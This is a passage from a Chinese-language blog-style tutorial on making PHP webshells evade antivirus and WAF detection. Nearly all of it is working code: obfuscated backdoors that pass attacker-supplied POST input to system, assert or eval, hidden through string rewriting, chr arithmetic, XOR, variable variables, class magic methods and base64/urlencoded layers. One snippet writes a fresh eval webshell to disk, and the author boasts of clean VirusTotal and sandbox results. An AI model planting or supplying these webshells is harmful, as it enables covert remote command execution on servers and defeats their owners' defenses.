</span><span class="token comment" spellcheck="true">//__FILE__为976534.php
</span><span class="token comment" spellcheck="true">//substr(__FILE__, -10, 6)即从文件名中提取出976534
</span><span class="token comment" spellcheck="true">//confusion(intval(976534))即输出了sysTem（高危函数），拼接即可
</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true"> //sysTem($_POST['aabyss']);</span></code></pre>


<p>首先先读取文件名，从 <code>976534.php</code> 文件名中提取出 <code>976534</code> ，然后带入函数中就成功返还 <code>sysTem</code> 高危函数了，可以配合其他姿势一起使用，达成免杀效果</p>
<h3 id="23">2.3 特殊字符串</h3>
<p>主要是通过一些特殊的字符串，来干扰到杀软的正则判断并执行恶意代码（各种回车、换行、null和空白字符等）</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>
$<span class="token variable">$z</span> <span class="token operator">=</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">eval<span class="token punctuation">(</span></span>``<span class="token punctuation">.</span><span class="token variable">$hello</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h2 id="3_1">3 生成新文件绕过</h2>
<p>这是我之前写的一个免杀，其实原理也很简单，该PHP本身没法执行命令，但是运行后可以在同目录混淆写入一个WebShell，也是可以进行免杀的：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$hahaha</span> <span class="token operator">=</span> <span class="token function">strtr<span class="token punctuation">(</span></span><span class="token string">"abatme"</span><span class="token punctuation">,</span><span class="token string">"me"</span><span class="token punctuation">,</span><span class="token string">"em"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> //$hahaha = abatem
</span><span class="token variable">$wahaha</span> <span class="token operator">=</span> <span class="token function">strtr<span class="token punctuation">(</span></span><span class="token variable">$hahaha</span><span class="token punctuation">,</span><span class="token string">"ab"</span><span class="token punctuation">,</span><span class="token string">"sy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true"> //$wahaha = system（高危函数）
</span><span class="token variable">$gogogo</span> <span class="token operator">=</span> <span class="token function">strtr<span class="token punctuation">(</span></span>'<span class="token keyword">echo</span> "<span class="token php"><span class="token delimiter">&lt;?php</span> evqrw<span class="token variable">$_yKST</span><span class="token punctuation">[</span><span class="token constant">AABYSS</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?&gt;</span></span><span class="token string">" &gt; ./out.php',"</span>qrwxyK<span class="token string">","</span><span class="token function">al<span class="token punctuation">(</span></span><span class="token constant">_PO</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">
//$gogogo = 'echo "</span><span class="token php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval<span class="token punctuation">(</span></span><span class="token constant">_POST</span><span class="token punctuation">[</span><span class="token constant">AABYSS</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?&gt;</span></span>" <span class="token operator">&gt;</span> <span class="token punctuation">.</span><span class="token operator">/</span>out<span class="token punctuation">.</span>php'
<span class="token variable">$wahaha</span><span class="token punctuation">(</span><span class="token variable">$gogogo</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"> //将一句话木马内容写入同目录下的out.php中</span></code></pre>


<p>现在看这个是不是很简单，但是这个可是VirusTotal全绿、微步沙箱和百度沙箱都过的哦~</p>
<p>没想到吧~ 其实在这个简单的基础上还可以拓展出来进行高阶免杀操作</p>
<h2 id="4_1">4 回调函数绕过</h2>
<p>通过回调函数，来执行对应的命令，这里举两个例子：</p>
<h3 id="41-call_user_func_array">4.1 call_user_func_array()</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token comment" spellcheck="true">//ASCII编码解密后为assert高危函数
</span><span class="token variable">$f</span> <span class="token operator">=</span>  <span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">98</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">116</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">116</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">103</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">112</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">110</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func_array<span class="token punctuation">(</span></span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h3 id="42-array_map">4.2 array_map()</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">fun<span class="token punctuation">(</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token comment" spellcheck="true"> //ASCII编码解密后为assert高危函数
</span>    <span class="token variable">$f</span> <span class="token operator">=</span>  <span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">98</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">116</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">116</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">103</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">112</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr<span class="token punctuation">(</span></span><span class="token number">110</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span><span class="token variable">$f</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">fun<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //拿到assert高危函数
</span><span class="token variable">$pass</span> <span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">array_map<span class="token punctuation">(</span></span><span class="token variable">$user</span><span class="token punctuation">,</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>回调函数的免杀早早就被WAF盯上了，像这样单独使用一般都没办法免杀，所以一般都是配合其他手法使用</p>
<h2 id="5_1">5 可变变量绕过</h2>
<h3 id="51">5.1 简单可变变量</h3>
<p>什么叫可变变量呢？看一下具体例子就明白了：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //变量名为f，变量值为Hello
</span>$<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string">'AabyssZG'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"> //变量名为Hello（也就是$f的值），值为AabyssZG
</span><span class="token keyword">echo</span> <span class="token variable">$hello</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"> //输出AabyssZG</span></code></pre>


<p>那要怎么利用这个特性呢？如下：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$f</span> <span class="token operator">=</span><span class="token string">'hello'</span><span class="token punctuation">;</span>
$<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">eval<span class="token punctuation">(</span></span><span class="token variable">$hello</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"> //eval($_POST['aabyss']); </span></code></pre>


<h3 id="52">5.2 数组+变量引用混淆</h3>
<p>上文提到，可以通过 <code>compact</code> 创建一个包含变量名和它们的值的数组</p>
<p>那就可以用 <code>compact</code> 创建一个包含恶意函数和内容的数组，再引用出来拼接成语句即可</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true"> //配合其他姿势，将system高危函数传给z
</span><span class="token variable">$zhixin</span>  <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$z</span><span class="token punctuation">;</span>
<span class="token variable">$event</span> <span class="token operator">=</span> <span class="token string">'hahaha'</span><span class="token punctuation">;</span>

<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">compact<span class="token punctuation">(</span></span><span class="token string">"event"</span><span class="token punctuation">,</span> <span class="token string">"zhixin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"> //通过compact创建数组
</span><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token string">'wahaha'</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true"> //我将变量z进行修改为'wahaha'
</span>
<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">'zhixin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true"> //system($_POST['aabyss']); </span></code></pre>


<p>根据5.1学到的内容，可以发现传入数组，函数内容被替换是不会影响数组中的内容的</p>
<p>于是先用变量 <code>zhixin</code> 来引用变量 <code>z</code> 然后通过 <code>compact</code> 创建为数组，接下来再将变量 <code>z</code> 附上新的内容 <code>wahaha</code> ，传统的WAF追踪变量的内容时候，就会让查杀引擎误以为数组中的值不是 <code>system</code> 而是 <code>wahaha</code> ，从而达到WebShell免杀</p>
<h2 id="6_1">6 数组绕过</h2>
<p>先将高危函数部分存储在数组中，等到时机成熟后提取出来进行拼接</p>
<h3 id="61">6.1 一维数组</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">substr_replace<span class="token punctuation">(</span></span><span class="token string">"systxx"</span><span class="token punctuation">,</span><span class="token string">"em"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true"> //system（高危函数）
</span><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump<span class="token punctuation">(</span></span><span class="token variable">$z</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>数组内容如下：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token function">assert<span class="token punctuation">(</span></span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span></code></pre>


<h3 id="62">6.2 二维数组</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">substr_replace<span class="token punctuation">(</span></span><span class="token string">"systxx"</span><span class="token punctuation">,</span><span class="token string">"em"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true"> //system（高危函数）
</span><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$arrayName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$arrayName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$arrayName</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump<span class="token punctuation">(</span></span><span class="token variable">$z</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h2 id="7">7 类绕过</h2>
<p>通过自定义类或者使用已知的类，将恶意代码放入对应的类中进行执行</p>
<h3 id="71">7.1 单类</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$_1</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system<span class="token punctuation">(</span></span><span class="token string">"$this-&gt;a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$_2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$_2</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$_1</span> <span class="token operator">=</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>


<h3 id="72">7.2 多类</h3>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">class</span> <span class="token class-name">Test1</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span> <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">post<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Test2</span> <span class="token keyword">extends</span> <span class="token class-name">Test1</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token scope"><span class="token keyword">parent</span><span class="token punctuation">::</span></span><span class="token function">post<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system<span class="token punctuation">(</span></span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$fff</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test2</span><span class="token punctuation">;</span>
<span class="token variable">$zzz</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test1</span><span class="token punctuation">;</span></code></pre>


<p>主要还是要用一些魔术方法来进行ByPass</p>
<h2 id="8">8 嵌套运算绕过</h2>
<p>主要通过各种嵌套、异或以及运算来拼装出来想要的函数，再利用PHP允许动态函数执行的特点，拼接处高危函数名，如 <code>system</code> ，然后动态执行恶意代码之即可</p>
<h3 id="81">8.1 异或</h3>
<p><code>^</code> 为异或运算符，在PHP中两个变量进行异或时，会将字符串转换成二进制再进行异或运算，运算完再将结果从二进制转换成了字符串</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'.'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'4'</span><span class="token operator">^</span><span class="token string">'@'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'8'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token operator">^</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"> //system高危函数
</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'aabyss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>这里的话，可以参考国光大佬的Python脚本生成异或结果，然后来替换即可：<code>python3 xxx.py &gt; results.txt</code></p>
<pre class="codehilite language-python"><code class=" language-python"><span class="token keyword">import</span> string
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote

keys <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> keys<span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> keys<span class="token punctuation">:</span>
        asscii_number <span class="token operator">=</span> i<span class="token operator">^</span>j
        <span class="token keyword">if</span> <span class="token punctuation">(</span>asscii_number &gt;<span class="token operator">=</span> <span class="token number">65</span> <span class="token operator">and</span> asscii_number <span class="token operator">&lt;</span><span class="token operator">=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token punctuation">(</span>asscii_number &gt;<span class="token operator">=</span> <span class="token number">97</span> <span class="token operator">and</span> asscii_number <span class="token operator">&lt;</span><span class="token operator">=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">32</span> <span class="token operator">and</span> j <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span>
                temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">f</span><span class="token string">'{chr(asscii_number)} = ascii:{i} ^ ascii{j} =  {quote(chr(i))} ^ {quote(chr(j))}'</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span>asscii_number<span class="token punctuation">)</span><span class="token punctuation">)</span>
                results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
            <span class="token keyword">elif</span> i <span class="token operator">&lt;</span> <span class="token number">32</span> <span class="token operator">and</span> j &gt;<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">:</span>
                temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">f</span><span class="token string">'{chr(asscii_number)} = ascii:{i} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}'</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span>asscii_number<span class="token punctuation">)</span><span class="token punctuation">)</span>
                results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
            <span class="token keyword">elif</span> i &gt;<span class="token operator">=</span> <span class="token number">32</span> <span class="token operator">and</span> j <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span>
                temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">f</span><span class="token string">'{chr(asscii_number)} = {chr(i)} ^ ascii{j} = {quote(chr(i))} ^ {quote(chr(j))}'</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span>asscii_number<span class="token punctuation">)</span><span class="token punctuation">)</span>
                results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">f</span><span class="token string">'{chr(asscii_number)} = {chr(i)} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}'</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span>asscii_number<span class="token punctuation">)</span><span class="token punctuation">)</span>
                results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>

results<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> low_case <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">:</span>
    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
        <span class="token keyword">if</span> low_case <span class="token keyword">in</span> result<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> upper_case <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token punctuation">:</span>
    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
        <span class="token keyword">if</span> upper_case <span class="token keyword">in</span> result<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>


<h3 id="82">8.2 嵌套运算</h3>
<p>其实嵌套运算在WebShell免杀中算是常客了，让我们来看一下一个 <code>phpinfo()</code> 的嵌套运算</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$O00OO0</span><span class="token operator">=</span><span class="token function">urldecode<span class="token punctuation">(</span></span><span class="token string">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$O00O0O</span><span class="token operator">=</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">33</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">30</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$O0OO00</span><span class="token operator">=</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">33</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">24</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">24</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$OO0O00</span><span class="token operator">=</span><span class="token variable">$O0OO00</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">18</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O0OO00</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O0OO00</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">24</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$OO0000</span><span class="token operator">=</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">13</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$O00O0O</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">22</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">36</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">29</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">26</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">30</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">32</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">35</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">26</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token variable">$O00OO0</span><span class="token punctuation">{</span><span class="token number">30</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token function">eval<span class="token punctuation">(</span></span><span class="token variable">$O00O0O</span><span class="token punctuation">(</span><span class="token string">"JE8wTzAwMD0iU0VCb1d4VGJ2SGhRTnFqeW5JUk1jbWxBS1lrWnVmVkpVQ2llYUxkc3J0Z3dGWER6cEdPUFdMY3NrZXpxUnJBVUtCU2hQREdZTUZOT25FYmp0d1pwYVZRZEh5Z0NJdnhUSmZYdW9pbWw3N3QvbFg5VEhyT0tWRlpTSGk4eE1pQVRIazVGcWh4b21UMG5sdTQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>加密手法可以看我写的博客： <a href="https://blog.zgsec.cn/index.php/archives/147/" title="https://blog.zgsec.cn/index.php/archives/147/">https://blog.zgsec.cn/index.php/archives/147/</a></p>
<h2 id="9">9 传参绕过</h2>
<p>将恶意代码不写入文件，而是通过传参传入，所以这个比较难以被常规WAF所识别</p>
